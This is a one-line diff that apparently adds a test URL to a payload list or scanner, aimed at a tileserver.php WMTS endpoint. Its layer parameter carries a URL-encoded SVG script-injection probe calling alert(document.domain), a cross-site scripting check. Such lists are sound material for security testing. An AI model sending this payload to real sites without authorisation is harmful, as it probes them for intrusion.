@@ -1,0 +1,1 @@
+/tileserver.php/wmts/x/1/1/asd?Request=x&layer=%3Csvg+alert(document.domain)%3E
